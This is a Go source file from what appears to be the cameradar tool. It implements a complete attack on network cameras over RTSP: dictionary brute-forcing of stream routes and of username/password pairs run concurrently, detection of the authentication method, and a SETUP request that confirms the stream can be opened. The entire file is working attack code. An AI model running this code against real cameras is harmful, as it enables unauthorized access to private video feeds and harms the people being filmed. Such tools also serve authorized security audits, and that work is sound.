package cameradar

import (
	"fmt"
	"time"

	curl "github.com/ullaakut/go-curl"
)

// HTTP responses.
const (
	httpOK           = 200
	httpUnauthorized = 401
	httpForbidden    = 403
	httpNotFound     = 404
)

// CURL RTSP request types.
const (
	rtspDescribe = 2
	rtspSetup    = 4
)

// Attack attacks the given targets and returns the accessed streams.
func (s *Scanner) Attack(targets []Stream) ([]Stream, error) {
	if len(targets) == 0 {
		return nil, fmt.Errorf("unable to attack empty list of targets")
	}

	// Most cameras will be accessed successfully with these two attacks.
	s.term.StartStepf("Attacking routes of %d streams", len(targets))
	streams := s.AttackRoute(targets)

	s.term.StartStepf("Attempting to detect authentication methods of %d streams", len(targets))
	streams = s.DetectAuthMethods(streams)

	s.term.StartStepf("Attacking credentials of %d streams", len(targets))
	streams = s.AttackCredentials(streams)

	// But some cameras run GST RTSP Server which prioritizes 401 over 404 contrary to most cameras.
	// For these cameras, running another route attack will solve the problem.
	for _, stream := range streams {
		if !stream.RouteFound || !stream.CredentialsFound {
			s.term.StartStepf("Second round of attacks")
			streams = s.AttackRoute(streams)

			break
		}
	}

	s.term.StartStep("Validating that streams are accessible")
	streams = s.ValidateStreams(streams)

	s.term.EndStep()

	return streams, nil
}

// ValidateStreams tries to setup the stream to validate whether or not it is available.
func (s *Scanner) ValidateStreams(targets []Stream) []Stream {
	for i := range targets {
		targets[i].Available = s.validateStream(targets[i])
	}

	return targets
}

// AttackCredentials attempts to guess the provided targets' credentials using the given
// dictionary or the default dictionary if none was provided by the user.
func (s *Scanner) AttackCredentials(targets []Stream) []Stream {
	resChan := make(chan Stream)
	defer close(resChan)

	for i := range targets {
		// TODO: Perf Improvement: Skip cameras with no auth type detected, and set their
		// CredentialsFound value to true.
		go s.attackCameraCredentials(targets[i], resChan)
	}

	attackResults := []Stream{}
	// TODO: Change this into a for+select and make a successful result close the chan.
	for range targets {
		attackResults = append(attackResults, <-resChan)
	}

	for i := range attackResults {
		if attackResults[i].CredentialsFound {
			targets = replace(targets, attackResults[i])
		}
	}

	return targets
}

// AttackRoute attempts to guess the provided targets' streaming routes using the given
// dictionary or the default dictionary if none was provided by the user.
func (s *Scanner) AttackRoute(targets []Stream) []Stream {
	resChan := make(chan Stream)
	defer close(resChan)

	for i := range targets {
		go s.attackCameraRoute(targets[i], resChan)
	}

	attackResults := []Stream{}
	// TODO: Change this into a for+select and make a successful result close the chan.
	for range targets {
		attackResults = append(attackResults, <-resChan)
	}

	for i := range attackResults {
		if attackResults[i].RouteFound {
			targets = replace(targets, attackResults[i])
		}
	}

	return targets
}

// DetectAuthMethods attempts to guess the provided targets' authentication types, between
// digest, basic auth or none at all.
func (s *Scanner) DetectAuthMethods(targets []Stream) []Stream {
	for i := range targets {
		targets[i].AuthenticationType = s.detectAuthMethod(targets[i])

		var authMethod string
		switch targets[i].AuthenticationType {
		case 0:
			authMethod = "no"
		case 1:
			authMethod = "basic"
		case 2:
			authMethod = "digest"
		}

		s.term.Debugf("Stream %s uses %s authentication method\n", GetCameraRTSPURL(targets[i]), authMethod)
	}

	return targets
}

func (s *Scanner) attackCameraCredentials(target Stream, resChan chan<- Stream) {
	for _, username := range s.credentials.Usernames {
		for _, password := range s.credentials.Passwords {
			ok := s.credAttack(target, username, password)
			if ok {
				target.CredentialsFound = true
				target.Username = username
				target.Password = password
				resChan <- target
				return
			}
		}
	}

	target.CredentialsFound = false
	resChan <- target
}

func (s *Scanner) attackCameraRoute(target Stream, resChan chan<- Stream) {
	for _, route := range s.routes {
		ok := s.routeAttack(target, route)
		if ok {
			target.RouteFound = true
			target.Route = route
			resChan <- target
			return
		}
	}

	target.RouteFound = false
	resChan <- target
}

func (s *Scanner) detectAuthMethod(stream Stream) int {
	c := s.curl.Duphandle()

	attackURL := fmt.Sprintf(
		"rtsp://%s:%d/%s",
		stream.Address,
		stream.Port,
		stream.Route,
	)

	s.setCurlOptions(c)

	// Send a request to the URL of the stream we want to attack.
	_ = c.Setopt(curl.OPT_URL, attackURL)
	// Set the RTSP STREAM URI as the stream URL.
	_ = c.Setopt(curl.OPT_RTSP_STREAM_URI, attackURL)
	// 2 is CURL_RTSPREQ_DESCRIBE.
	_ = c.Setopt(curl.OPT_RTSP_REQUEST, 2)

	// Perform the request.
	err := c.Perform()
	if err != nil {
		s.term.Debugf("Perform failed: %v", err)
		return -1
	}

	authType, err := c.Getinfo(curl.INFO_HTTPAUTH_AVAIL)
	if err != nil {
		s.term.Debugf("Getinfo failed: %v", err)
		return -1
	}

	if s.verbose {
		s.term.Debugln("DESCRIBE", attackURL, "RTSP/1.0 >", authType)
	}

	return authType.(int)
}

func (s *Scanner) routeAttack(stream Stream, route string) bool {
	c := s.curl.Duphandle()

	attackURL := fmt.Sprintf(
		"rtsp://%s:%s@%s:%d/%s",
		stream.Username,
		stream.Password,
		stream.Address,
		stream.Port,
		route,
	)

	s.setCurlOptions(c)

	// Set proper authentication type.
	_ = c.Setopt(curl.OPT_HTTPAUTH, stream.AuthenticationType)
	_ = c.Setopt(curl.OPT_USERPWD, fmt.Sprint(stream.Username, ":", stream.Password))

	// Send a request to the URL of the stream we want to attack.
	_ = c.Setopt(curl.OPT_URL, attackURL)
	// Set the RTSP STREAM URI as the stream URL.
	_ = c.Setopt(curl.OPT_RTSP_STREAM_URI, attackURL)
	// 2 is CURL_RTSPREQ_DESCRIBE.
	_ = c.Setopt(curl.OPT_RTSP_REQUEST, rtspDescribe)

	// Perform the request.
	err := c.Perform()
	if err != nil {
		s.term.Debugf("Perform failed: %v", err)
		return false
	}

	// Get return code for the request.
	rc, err := c.Getinfo(curl.INFO_RESPONSE_CODE)
	if err != nil {
		s.term.Debugf("Getinfo failed: %v", err)
		return false
	}

	if s.verbose {
		s.term.Debugln("DESCRIBE", attackURL, "RTSP/1.0 >", rc)
	}
	// If it's a 401 or 403, it means that the credentials are wrong but the route might be okay.
	// If it's a 200, the stream is accessed successfully.
	if rc == httpOK || rc == httpUnauthorized || rc == httpForbidden {
		return true
	}
	return false
}

func (s *Scanner) credAttack(stream Stream, username string, password string) bool {
	c := s.curl.Duphandle()

	attackURL := fmt.Sprintf(
		"rtsp://%s:%s@%s:%d/%s",
		username,
		password,
		stream.Address,
		stream.Port,
		stream.Route,
	)

	s.setCurlOptions(c)

	// Set proper authentication type.
	_ = c.Setopt(curl.OPT_HTTPAUTH, stream.AuthenticationType)
	_ = c.Setopt(curl.OPT_USERPWD, fmt.Sprint(username, ":", password))

	// Send a request to the URL of the stream we want to attack.
	_ = c.Setopt(curl.OPT_URL, attackURL)
	// Set the RTSP STREAM URI as the stream URL.
	_ = c.Setopt(curl.OPT_RTSP_STREAM_URI, attackURL)
	// 2 is CURL_RTSPREQ_DESCRIBE.
	_ = c.Setopt(curl.OPT_RTSP_REQUEST, 2)

	// Perform the request.
	err := c.Perform()
	if err != nil {
		s.term.Debugf("Perform failed: %v", err)
		return false
	}

	// Get return code for the request.
	rc, err := c.Getinfo(curl.INFO_RESPONSE_CODE)
	if err != nil {
		s.term.Debugf("Getinfo failed: %v", err)
		return false
	}

	if s.verbose {
		s.term.Debugln("DESCRIBE", attackURL, "RTSP/1.0 >", rc)
	}

	// If it's a 404, it means that the route is incorrect but the credentials might be okay.
	// If it's a 200, the stream is accessed successfully.
	if rc == httpOK || rc == httpNotFound {
		return true
	}
	return false
}

func (s *Scanner) validateStream(stream Stream) bool {
	c := s.curl.Duphandle()

	attackURL := fmt.Sprintf(
		"rtsp://%s:%s@%s:%d/%s",
		stream.Username,
		stream.Password,
		stream.Address,
		stream.Port,
		stream.Route,
	)

	s.setCurlOptions(c)

	// Set proper authentication type.
	_ = c.Setopt(curl.OPT_HTTPAUTH, stream.AuthenticationType)
	_ = c.Setopt(curl.OPT_USERPWD, fmt.Sprint(stream.Username, ":", stream.Password))

	// Send a request to the URL of the stream we want to attack.
	_ = c.Setopt(curl.OPT_URL, attackURL)
	// Set the RTSP STREAM URI as the stream URL.
	_ = c.Setopt(curl.OPT_RTSP_STREAM_URI, attackURL)
	// 2 is CURL_RTSPREQ_SETUP.
	_ = c.Setopt(curl.OPT_RTSP_REQUEST, rtspSetup)

	_ = c.Setopt(curl.OPT_RTSP_TRANSPORT, "RTP/AVP;unicast;client_port=33332-33333")

	// Perform the request.
	err := c.Perform()
	if err != nil {
		s.term.Debugf("Perform failed: %v", err)
		return false
	}

	// Get return code for the request.
	rc, err := c.Getinfo(curl.INFO_RESPONSE_CODE)
	if err != nil {
		s.term.Debugf("Getinfo failed: %v", err)
		return false
	}

	if s.verbose {
		s.term.Debugln("SETUP", attackURL, "RTSP/1.0 >", rc)
	}
	// If it's a 200, the stream is accessed successfully.
	if rc == httpOK {
		return true
	}
	return false
}

func (s *Scanner) setCurlOptions(c Curler) {
	// Do not write sdp in stdout
	_ = c.Setopt(curl.OPT_WRITEFUNCTION, doNotWrite)
	// Do not use signals (would break multithreading).
	_ = c.Setopt(curl.OPT_NOSIGNAL, 1)
	// Do not send a body in the describe request.
	_ = c.Setopt(curl.OPT_NOBODY, 1)
	// Set custom timeout.
	_ = c.Setopt(curl.OPT_TIMEOUT_MS, int(s.timeout/time.Millisecond))
}

// HACK: See https://stackoverflow.com/questions/3572397/lib-curl-in-c-disable-printing
func doNotWrite([]uint8, interface{}) bool {
	return true
}
